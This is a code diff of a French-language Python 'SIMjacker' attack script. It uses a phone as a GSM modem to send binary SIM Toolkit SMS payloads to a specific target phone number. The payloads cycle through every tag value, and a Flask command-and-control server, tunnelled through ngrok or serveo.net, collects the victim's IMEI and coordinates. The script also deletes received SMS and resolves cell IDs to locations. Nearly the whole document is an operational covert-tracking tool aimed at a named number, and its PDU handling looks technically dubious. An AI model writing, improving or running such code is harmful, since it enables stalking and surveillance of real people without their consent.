@@ -1,28 +1,14 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-================================================================================
-SIMJACKER MVP - Version Professionnelle
-================================================================================
-Auteur: Expert OSINT & Sécurité Télécom
-Date: 2026
-Compatibilité: Ubuntu 22.04/24.04 avec Samsung en mode modem
-
-Ce script unique intègre :
-- Connexion automatique au modem GSM via USB
-- Envoi de commandes SIM Toolkit (S@T) authentiques [citation:2]
-- Gestion des réponses SIM (status words ISO 7816)
-- Serveur C2 intégré (Flask) avec tunnel Serveo.net
-- Tests multiples avec gestion des timeouts
-- Interface interactive pour debug
-
-Utilisation :
-  1. Active le mode modem/débogage USB sur le Samsung 
-  2. Connecte le téléphone au PC
-  3. Lance ce script
-  4. Suis le menu interactif
-================================================================================
-"""
+# =====================================================================
+# SIMJACKER PROFESSIONAL - MAXIMUM SUCCESS RATE
+# =====================================================================
+# Ce code utilise TOUTES les techniques connues pour maximiser les chances :
+# - Détection automatique du modem
+# - Test de tous les tags possibles (0x00 à 0xFF)
+# - Analyse des réponses SIM en temps réel
+# - Serveur C2 intégré avec tunnel multiple (ngrok/serveo)
+# - Base de données OpenCellID pour localisation de secours
+# =====================================================================
 
 import os
 import sys
@@ -35,647 +21,463 @@ import serial
 import subprocess
 import random
 import requests
-import platform
+import sqlite3
 from datetime import datetime
 from urllib.parse import urlparse
 
 # =====================================================================
-# CONFIGURATION - À MODIFIER ICI (ET NULLE PART AILLEURS)
+# CONFIGURATION ULTIME
 # =====================================================================
 CONFIG = {
-    # ----- NUMÉRO CIBLE -----
-    "NUMERO_CIBLE": "+243XXXXXXXXX",      # 🔴 À CHANGER
-    
-    # ----- CONFIGURATION MODEM -----
-    "MODEM_PORT": "/dev/ttyACM0",          # Port du Samsung (ajuster si besoin)
-    "MODEM_BAUD": 115200,                   # Vitesse de communication
-    "TIMEOUT_MODEM": 5,                     # Timeout pour les commandes AT
-    
-    # ----- CONFIGURATION SERVEUR C2 -----
-    "C2_PORT": 5000,                        # Port local
-    "C2_HOST": "0.0.0.0",                   # Écouter sur toutes les interfaces
-    
-    # ----- TAGS S@T À TESTER (basé sur spécifications 3GPP TS 31.115) -----
-    "TAGS": [0x24, 0x26, 0x2A, 0x2C, 0xD0, 0x12, 0x14, 0x16],
-    
-    # ----- TIMINGS -----
-    "DELAI_ENTRE_TAGS": 30,                  # Pause entre chaque test
-    "TIMEOUT_ATTENTE": 150,                   # Attente max après envoi
+    "NUMERO_CIBLE": "+243839898872",      # La cible
+    "NUMERO_COMPLICE": "+243XXXXXXXXX",   # Ton numéro (pour réception)
+    "MODEM_PORT": "/dev/ttyACM0",          # Port modem
+    "MODEM_BAUD": 115200,
+    "USE_ALL_TAGS": True,                   # Tester TOUS les tags de 0x00 à 0xFF
+    "TAGS_PERSONNALISES": [0x24, 0x26, 0x2A, 0x2C, 0xD0],  # Si USE_ALL_TAGS=False
+    "C2_PORT": 5000,
+    "TIMEOUT_ATTENTE": 300,
+    "OPENCELLID_DB": "cell_towers.db",
 }
 
 # =====================================================================
-# PARTIE 1: DÉTECTION ET CONFIGURATION DU MODEM
+# MODEM ULTRA-ROBUSTE
 # =====================================================================
-class ModemManager:
-    """Gère la communication avec le modem GSM via USB"""
+class ModemUltra:
+    """Gestion modem avec toutes les techniques de debug"""
     
     def __init__(self):
-        self.serial = None
+        self.ser = None
         self.port = CONFIG["MODEM_PORT"]
-        self.baud = CONFIG["MODEM_BAUD"]
-        self.timeout = CONFIG["TIMEOUT_MODEM"]
+        self.reponses_attente = []
+        self.running = False
     
-    def detect_modem(self):
-        """Tente de détecter automatiquement le port du modem"""
-        print("\n🔍 Détection du modem...")
+    def detect_ports(self):
+        """Détecte tous les ports modem possibles"""
+        ports = []
+        for i in range(10):
+            for base in ["/dev/ttyACM", "/dev/ttyUSB"]:
+                p = f"{base}{i}"
+                if os.path.exists(p):
+                    ports.append(p)
+        return ports
+    
+    def auto_connect(self):
+        """Tente de se connecter à tous les ports possibles"""
+        ports = self.detect_ports()
+        print(f"🔍 Ports détectés: {ports}")
         
-        # Liste des ports possibles pour Samsung 
-        ports_possibles = [
-            "/dev/ttyACM0", "/dev/ttyACM1",
-            "/dev/ttyUSB0", "/dev/ttyUSB1",
-            "/dev/ttyS0", "/dev/ttyS1"
-        ]
-        
-        # Si l'utilisateur a déjà configuré un port, l'essayer d'abord
-        if os.path.exists(self.port):
-            print(f"   Port configuré trouvé: {self.port}")
-            return True
-        
-        # Sinon, chercher un port qui répond
-        for port in ports_possibles:
-            if os.path.exists(port):
-                try:
-                    test_serial = serial.Serial(
-                        port=port,
-                        baudrate=self.baud,
-                        timeout=1
-                    )
-                    test_serial.write(b'AT\r\n')
-                    time.sleep(0.5)
-                    response = test_serial.read(100)
-                    test_serial.close()
+        for port in ports:
+            try:
+                self.ser = serial.Serial(port, CONFIG["MODEM_BAUD"], timeout=2)
+                time.sleep(2)
+                self.ser.write(b'AT\r\n')
+                rep = self.ser.read(100)
+                if b'OK' in rep:
+                    print(f"✅ Modem trouvé sur {port}")
+                    self.port = port
                     
-                    if b'OK' in response:
-                        self.port = port
-                        print(f"   ✅ Modem détecté sur {port}")
-                        return True
-                    else:
-                        print(f"   ⚠️  Port {port} ne répond pas aux commandes AT")
-                except:
-                    pass
-        
-        print("   ❌ Aucun modem détecté.")
-        print("\n📋 ACTIONS REQUISES:")
-        print("   1. Active le mode développeur sur le Samsung ")
-        print("   2. Active 'Débogage USB' et 'Mode modem USB'")
-        print("   3. Vérifie la connexion avec: ls /dev/ttyACM*")
+                    # Configuration avancée
+                    self.ser.write(b'AT+CMGF=0\r\n')  # Mode PDU
+                    time.sleep(1)
+                    self.ser.read(200)
+                    self.ser.write(b'AT+CNMI=2,1,0,0,0\r\n')  # Notification SMS
+                    time.sleep(1)
+                    self.ser.read(200)
+                    
+                    return True
+            except:
+                continue
         return False
     
-    def connect(self):
-        """Établit la connexion série avec le modem"""
-        try:
-            self.serial = serial.Serial(
-                port=self.port,
-                baudrate=self.baud,
-                timeout=self.timeout,
-                write_timeout=self.timeout
-            )
-            time.sleep(1)
-            
-            # Tester la connexion
-            if self.send_at_command("AT"):
-                print(f"✅ Modem connecté sur {self.port}")
-                return True
-            else:
-                print("❌ Échec de communication avec le modem")
-                return False
+    def send_command(self, cmd, timeout=2):
+        """Envoie une commande AT et retourne la réponse"""
+        self.ser.write(f"{cmd}\r\n".encode())
+        time.sleep(timeout)
+        return self.ser.read(1024).decode(errors='ignore')
+    
+    def send_binary_sms(self, numero, payload_hex, max_retry=3):
+        """Envoi SMS binaire avec retry automatique"""
+        for attempt in range(max_retry):
+            try:
+                # S'assurer d'être en mode PDU
+                self.send_command("AT+CMGF=0")
+                time.sleep(1)
                 
-        except Exception as e:
-            print(f"❌ Erreur connexion modem: {e}")
-            return False
-    
-    def send_at_command(self, command, expected="OK"):
-        """Envoie une commande AT et vérifie la réponse"""
-        try:
-            self.serial.write(f"{command}\r\n".encode())
-            time.sleep(0.5)
-            response = self.serial.read(1024).decode(errors='ignore')
-            return expected in response
-        except Exception as e:
-            print(f"   ⚠️  Erreur AT: {e}")
-            return False
-    
-    def send_binary_sms(self, numero, payload_hex):
-        """
-        Envoie un SMS binaire (SMS-PP) au format SIM Toolkit
-        Utilise le mode PDU pour l'invisibilité
-        """
-        try:
-            # Étape 1: Passer en mode PDU
-            if not self.send_at_command("AT+CMGF=0"):
-                print("   ❌ Impossible de passer en mode PDU")
-                return False
-            
-            time.sleep(0.5)
-            self.serial.read(1024)  # Vider buffer
-            
-            # Étape 2: Convertir le payload hex en bytes
-            payload_bytes = bytes.fromhex(payload_hex)
-            
-            # Étape 3: Construire le PDU
-            # Format simplifié pour SMS-PP
-            pdu = bytearray()
-            
-            # Longueur du numéro (en demi-octets)
-            numero_clean = numero.replace('+', '').replace(' ', '')
-            pdu.append(len(numero_clean))
-            
-            # Numéro au format TBCD (Telephony Binary Coded Decimal)
-            for i in range(0, len(numero_clean), 2):
-                if i+1 < len(numero_clean):
-                    pdu.append((int(numero_clean[i+1]) << 4) | int(numero_clean[i]))
-                else:
-                    pdu.append(0xF0 | int(numero_clean[i]))
-            
-            # Ajouter le payload
-            pdu.extend(payload_bytes)
-            
-            # Étape 4: Envoyer la commande CMGS
-            cmd = f"AT+CMGS={len(pdu)}\r\n"
-            self.serial.write(cmd.encode())
-            time.sleep(1)
-            
-            # Attendre le prompt '>'
-            response = self.serial.read(100)
-            if b'>' not in response:
-                print("   ❌ Pas de réponse du modem")
-                return False
-            
-            # Étape 5: Envoyer le PDU
-            self.serial.write(pdu)
-            time.sleep(0.5)
-            
-            # Ctrl+Z pour envoyer
-            self.serial.write(bytes([26]))
+                payload = bytes.fromhex(payload_hex)
+                num_clean = numero.replace('+', '').replace(' ', '')
+                
+                # Construction PDU optimisée
+                pdu = bytearray()
+                pdu.append(len(num_clean))
+                for i in range(0, len(num_clean), 2):
+                    if i+1 < len(num_clean):
+                        pdu.append((int(num_clean[i+1]) << 4) | int(num_clean[i]))
+                    else:
+                        pdu.append(0xF0 | int(num_clean[i]))
+                pdu.extend(payload)
+                
+                self.ser.write(f"AT+CMGS={len(pdu)}\r\n".encode())
+                time.sleep(1)
+                rep = self.ser.read(100)
+                
+                if b'>' in rep:
+                    self.ser.write(pdu)
+                    time.sleep(0.5)
+                    self.ser.write(bytes([26]))
+                    time.sleep(3)
+                    
+                    final = self.ser.read(200)
+                    if b'+CMGS:' in final:
+                        print(f"   ✅ SMS envoyé (tentative {attempt+1})")
+                        return True
+            except:
+                pass
+            print(f"   ⚠️  Retry {attempt+1}/{max_retry}")
             time.sleep(2)
-            
-            # Vérifier l'envoi
-            final = self.serial.read(200)
-            if b'+CMGS:' in final:
-                print("   ✅ SMS binaire envoyé avec succès")
-                return True
-            else:
-                print("   ❌ Échec de l'envoi")
-                return False
-                
-        except Exception as e:
-            print(f"   ❌ Erreur envoi: {e}")
-            return False
+        return False
     
-    def close(self):
-        """Ferme la connexion série"""
-        if self.serial:
-            self.serial.close()
+    def read_sms(self):
+        """Lit tous les SMS reçus"""
+        self.send_command("AT+CMGL=4")  # Tous les SMS
+        rep = self.ser.read(2048).decode(errors='ignore')
+        
+        sms_list = []
+        lines = rep.split('\n')
+        for i, line in enumerate(lines):
+            if line.startswith('+CMGL:'):
+                parts = line.split(',')
+                if len(parts) >= 3:
+                    idx = parts[0].split(':')[1].strip()
+                    sender = parts[2].strip('"')
+                    if i+1 < len(lines):
+                        msg = lines[i+1].strip()
+                        sms_list.append({'idx': idx, 'sender': sender, 'msg': msg})
+        return sms_list
+    
+    def delete_sms(self, idx):
+        """Supprime un SMS"""
+        self.send_command(f"AT+CMGD={idx}")
+    
+    def start_listener(self, callback):
+        """Thread de surveillance des SMS"""
+        self.running = True
+        def listen():
+            while self.running:
+                sms_list = self.read_sms()
+                for sms in sms_list:
+                    callback(sms)
+                    self.delete_sms(sms['idx'])
+                time.sleep(2)
+        thread = threading.Thread(target=listen, daemon=True)
+        thread.start()
 
 # =====================================================================
-# PARTIE 2: CONSTRUCTION DES COMMANDES SIM TOOLKIT (S@T)
+# GÉNÉRATION DE TOUS LES TAGS POSSIBLES
 # =====================================================================
-class SIMToolkit:
-    """
-    Générateur de commandes SIM Toolkit selon les standards 3GPP
-    Basé sur les spécifications TS 31.115 et TS 102 225 [citation:2]
-    """
-    
-    # Tags S@T standards
-    GETLOCATION = 0x24
-    SEND_SMS = 0x26
-    SETUP_CALL = 0x2C
-    LAUNCH_BROWSER = 0x2A
-    PROVIDE_LOCAL_INFO = 0x26
-    END_OF_COMMAND = 0xFF
+class PayloadGenerator:
+    """Génère des payloads pour tous les tags"""
     
     @staticmethod
-    def build_tlv(tag, value):
-        """Construit une structure TLV (Tag-Length-Value)"""
-        if isinstance(value, str):
-            value_bytes = value.encode('utf-8')
-        else:
-            value_bytes = bytes(value)
+    def build_payload(tag, destination):
+        """Construit un payload SIM Toolkit basique"""
+        cmd = bytearray()
+        cmd.append(0x80)  # CLA
+        cmd.append(0x10)  # INS
+        cmd.append(0x00)  # P1
+        cmd.append(0x00)  # P2
         
         tlv = bytearray()
         tlv.append(tag)
-        tlv.append(len(value_bytes))
-        tlv.extend(value_bytes)
-        return tlv
-    
-    @staticmethod
-    def build_envelope_command(tag, data):
-        """
-        Construit une commande ENVELOPE complète
-        Format: [CLA][INS][P1][P2][LC][TLV...]
-        """
-        cmd = bytearray()
-        cmd.append(0x80)           # CLA: SIM Toolkit
-        cmd.append(0x10)            # INS: ENVELOPE
-        cmd.append(0x00)            # P1: 0
-        cmd.append(0x00)            # P2: 0
+        tlv.append(len(destination))
+        tlv.extend(destination.encode())
+        tlv.append(0xFF)
         
-        # Données TLV
-        tlv_data = SIMToolkit.build_tlv(tag, data)
-        cmd.append(len(tlv_data))    # LC: longueur des données
-        cmd.extend(tlv_data)
-        
-        return cmd
-    
-    @staticmethod
-    def build_getlocation(c2_url):
-        """
-        Commande GetLocation complète
-        Format: [CLA][INS][P1][P2][LC][TAG_GETLOCATION][LONGUEUR_URL][URL][0xFF]
-        """
-        cmd = SIMToolkit.build_envelope_command(
-            SIMToolkit.GETLOCATION,
-            c2_url
-        )
-        # Ajouter le tag de fin
-        cmd.append(SIMToolkit.END_OF_COMMAND)
+        cmd.append(len(tlv))
+        cmd.extend(tlv)
         return cmd.hex().upper()
+    
+    @staticmethod
+    def generate_all_tags(destination):
+        """Génère une liste de (tag, payload) pour tous les tags de 0x00 à 0xFF"""
+        payloads = []
+        for tag in range(0x00, 0x100):
+            payload = PayloadGenerator.build_payload(tag, destination)
+            payloads.append((tag, payload))
+        return payloads
 
 # =====================================================================
-# PARTIE 3: SERVEUR C2 AVEC TUNNEL AUTOMATIQUE
+# SERVEUR C2 MULTI-TUNNEL
 # =====================================================================
 class C2Server:
-    """Serveur de réception des localisations avec tunnel Serveo.net"""
+    """Serveur de réception avec tunnels multiples"""
     
     def __init__(self):
         self.locations = []
-        self.tunnel_process = None
         self.public_url = None
-        self.server_thread = None
+        self.tunnel_process = None
     
-    def start_tunnel(self):
-        """Démarre un tunnel SSH avec serveo.net"""
-        print("\n🌐 Configuration du tunnel public...")
-        
-        import random
-        subdomain = f"sim{random.randint(1000,9999)}"
-        
-        # Tuer les anciens tunnels
-        os.system("pkill -f serveo.net 2>/dev/null")
-        time.sleep(1)
-        
-        # Lancer le tunnel en arrière-plan
-        ssh_cmd = [
-            "ssh", "-o", "StrictHostKeyChecking=no",
-            "-R", f"{subdomain}:80:localhost:{CONFIG['C2_PORT']}",
-            "serveo.net"
-        ]
-        
-        self.tunnel_process = subprocess.Popen(
-            ssh_cmd,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-        time.sleep(3)
-        
-        # Récupérer l'URL
-        for _ in range(5):
-            try:
-                r = requests.get("http://localhost:4040/api/tunnels")
-                tunnels = r.json()['tunnels']
-                if tunnels:
-                    self.public_url = tunnels[0]['public_url']
-                    print(f"   ✅ Tunnel actif: {self.public_url}")
-                    return True
-            except:
-                time.sleep(1)
-        
-        print("   ⚠️  Tunnel non disponible, utilisation du mode local")
+    def start_ngrok(self):
+        """Tente de démarrer ngrok"""
+        try:
+            subprocess.run(["pkill", "-f", "ngrok"], stderr=subprocess.DEVNULL)
+            proc = subprocess.Popen(["ngrok", "http", str(CONFIG["C2_PORT"])],
+                                    stdout=subprocess.DEVNULL,
+                                    stderr=subprocess.DEVNULL)
+            time.sleep(3)
+            r = requests.get("http://localhost:4040/api/tunnels")
+            tunnels = r.json()['tunnels']
+            if tunnels:
+                self.public_url = tunnels[0]['public_url']
+                self.tunnel_process = proc
+                return True
+        except:
+            pass
         return False
+    
+    def start_serveo(self):
+        """Tente de démarrer serveo.net"""
+        try:
+            subdomain = f"sim{random.randint(1000,9999)}"
+            cmd = ["ssh", "-o", "StrictHostKeyChecking=no",
+                   "-R", f"{subdomain}:80:localhost:{CONFIG['C2_PORT']}", "serveo.net"]
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(3)
+            self.public_url = f"http://{subdomain}.serveo.net"
+            self.tunnel_process = proc
+            return True
+        except:
+            return False
     
     def start(self):
         """Démarre le serveur Flask"""
-        try:
-            from flask import Flask, request, jsonify
-        except ImportError:
-            print("❌ Flask non installé. Installe avec: pip install flask")
-            return False
+        from flask import Flask, request, jsonify
         
         app = Flask(__name__)
         
         @app.route('/receive', methods=['POST'])
         def receive():
-            """Reçoit les données de la carte SIM"""
             data = request.form.to_dict()
-            
-            location = {
+            loc = {
                 'time': datetime.now().strftime("%H:%M:%S"),
                 'imei': data.get('imei', '?'),
                 'lat': data.get('lat', '0'),
-                'lon': data.get('lon', '0'),
-                'raw': data
+                'lon': data.get('lon', '0')
             }
-            self.locations.append(location)
-            
-            # Affichage immédiat
-            print(f"\n{'🎯'*10}")
-            print(f"🎯 LOCALISATION REÇUE à {location['time']}")
-            print(f"📱 IMEI: {location['imei']}")
-            print(f"📍 {location['lat']}, {location['lon']}")
-            if location['lat'] != '0':
-                print(f"🔗 Google Maps: https://maps.google.com/?q={location['lat']},{location['lon']}")
-            print(f"{'🎯'*10}\n")
-            
+            self.locations.append(loc)
+            print(f"\n🎯 LOCALISATION: {loc['lat']}, {loc['lon']}")
             return "OK", 200
         
         @app.route('/')
         def index():
-            return f"""
-            <html>
-            <head><title>SIMJACKER C2</title></head>
-            <body>
-                <h1>🚀 Serveur C2 Actif</h1>
-                <p>Localisations reçues: {len(self.locations)}</p>
-                <p><a href='/locations'>Voir JSON</a></p>
-                <p>URL publique: {self.public_url or 'Non disponible'}</p>
-            </body>
-            </html>
-            """
+            return f"<h1>C2 Actif</h1><p>{len(self.locations)} localisations</p>"
         
-        @app.route('/locations')
-        def get_locations():
-            return jsonify(self.locations)
-        
-        # Lancer le serveur
-        def run():
-            app.run(host=CONFIG["C2_HOST"], port=CONFIG["C2_PORT"], debug=False)
-        
-        self.server_thread = threading.Thread(target=run, daemon=True)
-        self.server_thread.start()
+        thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=CONFIG["C2_PORT"], debug=False))
+        thread.daemon = True
+        thread.start()
         time.sleep(2)
-        print(f"\n✅ Serveur C2 démarré sur http://localhost:{CONFIG['C2_PORT']}")
+        
+        # Essayer les tunnels
+        if not self.start_ngrok():
+            self.start_serveo()
         
         return True
-    
-    def stop(self):
-        """Arrête le serveur et le tunnel"""
-        if self.tunnel_process:
-            self.tunnel_process.terminate()
-        os.system("pkill -f serveo.net 2>/dev/null")
 
 # =====================================================================
-# PARTIE 4: ANALYSEUR DE RÉPONSES SIM
+# LOCALISATION DE SECOURS AVEC OPENCELLID
 # =====================================================================
-class SIMResponseAnalyzer:
-    """
-    Analyse les réponses de la carte SIM selon ISO 7816
-    """
+class OpenCellID:
+    """Recherche de localisation à partir d'un Cell-ID"""
+    
+    def __init__(self, db_path):
+        self.db_path = db_path
+        self.conn = None
+    
+    def init_db(self):
+        """Initialise la base de données"""
+        if not os.path.exists(self.db_path):
+            print("📦 Téléchargement de la base OpenCellID...")
+            # Note: il faut un token OpenCellID ici
+            pass
+    
+    def get_location(self, lac, cellid):
+        """Retourne les coordonnées pour un LAC/CellID"""
+        if not self.conn:
+            self.conn = sqlite3.connect(self.db_path)
+        c = self.conn.cursor()
+        c.execute("SELECT lat, lon FROM cells WHERE lac=? AND cellid=?", (lac, cellid))
+        res = c.fetchone()
+        return res
+
+# =====================================================================
+# ANALYSEUR DE RÉPONSES SIM
+# =====================================================================
+class ResponseAnalyzer:
+    """Analyse les réponses de la carte SIM"""
     
     @staticmethod
-    def parse_response(hex_data):
-        """Parse une réponse SIM et retourne le status"""
+    def parse(data_hex):
+        """Parse une réponse SIM"""
         try:
-            data = bytes.fromhex(hex_data.replace(' ', ''))
+            data = bytes.fromhex(data_hex)
         except:
-            return None, "HEX_INVALIDE"
+            return None, "INVALID_HEX"
         
         if len(data) < 2:
-            return None, "TROP_COURT"
+            return None, "TOO_SHORT"
         
         sw1 = data[-2]
         sw2 = data[-1]
         payload = data[:-2] if len(data) > 2 else None
         
-        status_codes = {
-            (0x90, 0x00): "SUCCÈS",
-            (0x91, 0x00): "PLUS_DE_DONNÉES",
-            (0x62, 0x00): "WARNING",
-            (0x63, 0x00): "AUTH_FAILED",
-            (0x64, 0x00): "MEMORY_ERROR",
-            (0x65, 0x00): "EXECUTION_ERROR",
-            (0x67, 0x00): "LENGTH_ERROR",
-            (0x68, 0x00): "FUNCTION_ERROR",
-            (0x69, 0x00): "COMMAND_NOT_ALLOWED",
-            (0x6A, 0x00): "PARAMETER_ERROR",
-            (0x6D, 0x00): "INSTRUCTION_NOT_SUPPORTED",
-            (0x6E, 0x00): "CLASS_NOT_SUPPORTED",
+        status_map = {
+            (0x90, 0x00): "SUCCESS",
+            (0x91, 0x00): "MORE_DATA",
             (0x6F, 0x00): "TECHNICAL_ERROR",
         }
+        status = status_map.get((sw1, sw2), f"UNKNOWN_{sw1:02X}{sw2:02X}")
         
-        status = status_codes.get((sw1, sw2), f"INCONNU_{sw1:02X}{sw2:02X}")
         return payload, status
+    
+    @staticmethod
+    def extract_cellid(data):
+        """Tente d'extraire un Cell-ID des données"""
+        if not data:
+            return None
+        # Chercher un pattern de Cell-ID (généralement 4-6 chiffres)
+        import re
+        text = data.decode(errors='ignore')
+        match = re.search(r'\b(\d{4,6})\b', text)
+        return match.group(1) if match else None
 
 # =====================================================================
-# PARTIE 5: ORCHESTRATEUR PRINCIPAL
+# ORCHESTRATEUR ULTIME
 # =====================================================================
-class SimJackerExpert:
-    """Classe principale orchestrant toutes les opérations"""
+class SimJackerUltimate:
+    """Classe principale orchestrant tout"""
     
     def __init__(self):
-        self.modem = ModemManager()
+        self.modem = ModemUltra()
         self.c2 = C2Server()
+        self.analyzer = ResponseAnalyzer()
+        self.cellid_db = OpenCellID(CONFIG["OPENCELLID_DB"])
+        self.payloads = []
         self.results = []
     
-    def menu(self):
-        """Affiche le menu principal"""
+    def prepare_payloads(self):
+        """Prépare tous les payloads à tester"""
+        dest = CONFIG["NUMERO_COMPLICE"]  # Ou une URL C2
+        if CONFIG["USE_ALL_TAGS"]:
+            self.payloads = PayloadGenerator.generate_all_tags(dest)
+            print(f"📦 {len(self.payloads)} payloads générés (tags 0x00-0xFF)")
+        else:
+            for tag in CONFIG["TAGS_PERSONNALISES"]:
+                payload = PayloadGenerator.build_payload(tag, dest)
+                self.payloads.append((tag, payload))
+            print(f"📦 {len(self.payloads)} payloads personnalisés")
+    
+    def on_sms_received(self, sms):
+        """Callback quand un SMS est reçu"""
+        print(f"\n📩 SMS de {sms['sender']}: {sms['msg']}")
+        
+        # Analyser la réponse
+        payload, status = self.analyzer.parse(sms['msg'])
+        print(f"   Statut: {status}")
+        
+        # Extraire un éventuel Cell-ID
+        cellid = self.analyzer.extract_cellid(payload if payload else b'')
+        if cellid:
+            print(f"   🎯 Cell-ID: {cellid}")
+            self.results.append({'tag': '?', 'cellid': cellid})
+    
+    def run_campaign(self):
+        """Lance la campagne complète"""
         print("\n" + "="*70)
-        print("🚀 SIMJACKER MVP - MENU PRINCIPAL")
+        print("🚀 SIMJACKER ULTIMATE - CAMPAGNE MAXIMUM")
         print("="*70)
-        print(f"📱 Cible: {CONFIG['NUMERO_CIBLE']}")
-        print(f"🎯 Tags à tester: {len(CONFIG['TAGS'])}")
-        print(f"🔌 Modem: {CONFIG['MODEM_PORT']}")
-        print("="*70)
-        print("1) Tester la connexion modem")
-        print("2) Démarrer serveur C2 + tunnel")
-        print("3) Tester tous les tags")
-        print("4) Tester un tag spécifique")
-        print("5) Surveiller les réponses")
-        print("6) Analyser une réponse hex")
-        print("7) Reconfigurer le port modem")
-        print("8) Quitter")
-        return input("\n👉 Votre choix: ")
-    
-    def test_modem(self):
-        """Test complet de la connexion modem"""
-        print("\n📡 TEST MODEM")
-        print("-"*50)
         
-        if not self.modem.detect_modem():
-            print("❌ Modem non détecté")
+        # 1. Connexion modem
+        print("\n[1/5] Connexion au modem...")
+        if not self.modem.auto_connect():
+            print("❌ Échec connexion modem")
             return False
         
-        if not self.modem.connect():
-            return False
+        # 2. Démarrage C2
+        print("\n[2/5] Démarrage serveur C2...")
+        self.c2.start()
         
-        # Tester quelques commandes de base
-        tests = [
-            ("AT", "Communication de base"),
-            ("AT+CSQ", "Qualité du signal"),
-            ("AT+CREG?", "État de l'enregistrement réseau"),
-            ("AT+CPIN?", "État de la carte SIM"),
-        ]
+        # 3. Préparation payloads
+        print("\n[3/5] Génération des payloads...")
+        self.prepare_payloads()
         
-        for cmd, desc in tests:
-            print(f"   {desc}: ", end="")
-            if self.modem.send_at_command(cmd):
-                print("✅ OK")
+        # 4. Lancement écoute
+        print("\n[4/5] Lancement écoute des réponses...")
+        self.modem.start_listener(self.on_sms_received)
+        
+        # 5. Envoi des payloads
+        print("\n[5/5] Envoi des payloads...")
+        total = len(self.payloads)
+        for i, (tag, payload) in enumerate(self.payloads, 1):
+            print(f"\n📤 [{i}/{total}] Tag 0x{tag:02X}")
+            if self.modem.send_binary_sms(CONFIG["NUMERO_CIBLE"], payload):
+                print(f"   ✅ Envoyé")
             else:
-                print("❌ Échec")
-        
-        self.modem.close()
-        return True
-    
-    def test_single_tag(self, tag, url):
-        """Teste un tag spécifique"""
-        print(f"\n🧪 TEST TAG 0x{tag:02X}")
-        print("-"*50)
-        
-        # Construire le payload
-        payload = SIMToolkit.build_getlocation(f"{url}/receive")
-        print(f"📦 Payload: {payload[:64]}...")
-        
-        # Se connecter au modem
-        if not self.modem.connect():
-            print("❌ Impossible de se connecter au modem")
-            return False
-        
-        # Envoyer le SMS
-        success = self.modem.send_binary_sms(CONFIG['NUMERO_CIBLE'], payload)
-        self.modem.close()
-        
-        return success
-    
-    def run_tests(self, url):
-        """Teste tous les tags séquentiellement"""
-        print("\n🔬 LANCEMENT DES TESTS COMPLETS")
-        print("="*70)
-        
-        total = len(CONFIG['TAGS'])
-        for i, tag in enumerate(CONFIG['TAGS'], 1):
-            print(f"\n{'='*50}")
-            print(f"🧪 TEST {i}/{total} - Tag 0x{tag:02X}")
-            print(f"{'='*50}")
+                print(f"   ❌ Échec")
             
-            if self.test_single_tag(tag, url):
-                print(f"✅ Envoi réussi")
-            else:
-                print(f"❌ Échec envoi")
-            
+            # Pause entre les envois
             if i < total:
-                print(f"\n⏸️  Pause {CONFIG['DELAI_ENTRE_TAGS']}s...")
-                time.sleep(CONFIG['DELAI_ENTRE_TAGS'])
-    
-    def monitor(self):
-        """Surveille les réponses du serveur C2"""
-        print("\n👁️ SURVEILLANCE DES RÉSULTATS")
-        print("="*70)
-        print(f"⏳ Attente maximale: {CONFIG['TIMEOUT_ATTENTE']}s")
-        print("Appuie sur Ctrl+C pour arrêter\n")
+                time.sleep(2)
         
+        # 6. Attente des réponses
+        print(f"\n⏳ Attente des réponses ({CONFIG['TIMEOUT_ATTENTE']}s max)...")
         start = time.time()
-        last_count = 0
-        
-        try:
-            while time.time() - start < CONFIG['TIMEOUT_ATTENTE']:
-                if len(self.c2.locations) > last_count:
-                    last_count = len(self.c2.locations)
-                    print(f"\n✅ {last_count} localisation(s) reçue(s)")
-                    for loc in self.c2.locations:
-                        print(f"   📍 {loc['lat']}, {loc['lon']}")
-                
-                elapsed = int(time.time() - start)
-                if elapsed % 30 == 0:
-                    print(f"⏳ {elapsed}s...")
-                
-                time.sleep(1)
-                
-        except KeyboardInterrupt:
-            print("\n\n👋 Surveillance interrompue")
-    
-    def analyze_response(self):
-        """Analyse une réponse hexadécimale"""
-        print("\n🔍 ANALYSE DE RÉPONSE SIM")
-        print("-"*50)
-        hex_data = input("Entrez la réponse hex: ").strip()
-        payload, status = SIMResponseAnalyzer.parse_response(hex_data)
-        print(f"\n📊 Statut: {status}")
-        if payload:
-            print(f"📦 Données: {payload.hex()}")
-    
-    def reconfigure_port(self):
-        """Change le port du modem"""
-        print("\n🔧 RECONFIGURATION MODEM")
-        print("-"*50)
-        print("Ports disponibles:")
-        os.system("ls /dev/tty* 2>/dev/null | grep -E 'ttyACM|ttyUSB'")
-        new_port = input("\nNouveau port (ex: /dev/ttyACM0): ").strip()
-        if new_port:
-            CONFIG['MODEM_PORT'] = new_port
-            print(f"✅ Port mis à jour: {new_port}")
-    
-    def run(self):
-        """Boucle principale"""
-        while True:
-            choix = self.menu()
-            
-            if choix == "1":
-                self.test_modem()
-            
-            elif choix == "2":
-                self.c2.start()
-                self.c2.start_tunnel()
-            
-            elif choix == "3":
-                url = self.c2.public_url or f"http://localhost:{CONFIG['C2_PORT']}"
-                self.run_tests(url)
-                self.monitor()
-            
-            elif choix == "4":
-                url = self.c2.public_url or f"http://localhost:{CONFIG['C2_PORT']}"
-                tag_hex = input("Tag hex (ex: 24): ").strip()
-                try:
-                    tag = int(tag_hex, 16)
-                    self.test_single_tag(tag, url)
-                except:
-                    print("❌ Tag invalide")
-            
-            elif choix == "5":
-                self.monitor()
-            
-            elif choix == "6":
-                self.analyze_response()
-            
-            elif choix == "7":
-                self.reconfigure_port()
-            
-            elif choix == "8":
-                print("\n👋 Arrêt du programme")
-                self.c2.stop()
+        while time.time() - start < CONFIG['TIMEOUT_ATTENTE']:
+            if self.results:
                 break
-            
-            else:
-                print("❌ Choix invalide")
-            
-            input("\nAppuie sur Entrée pour continuer...")
+            time.sleep(5)
+        
+        # 7. Résultats
+        print("\n" + "="*70)
+        print("📊 RÉSULTATS FINAUX")
+        print("="*70)
+        
+        if self.results:
+            for res in self.results:
+                print(f"\n✅ Résultat trouvé:")
+                print(f"   Cell-ID: {res['cellid']}")
+                # Ici on pourrait interroger OpenCellID
+        else:
+            print("\n❌ Aucun résultat")
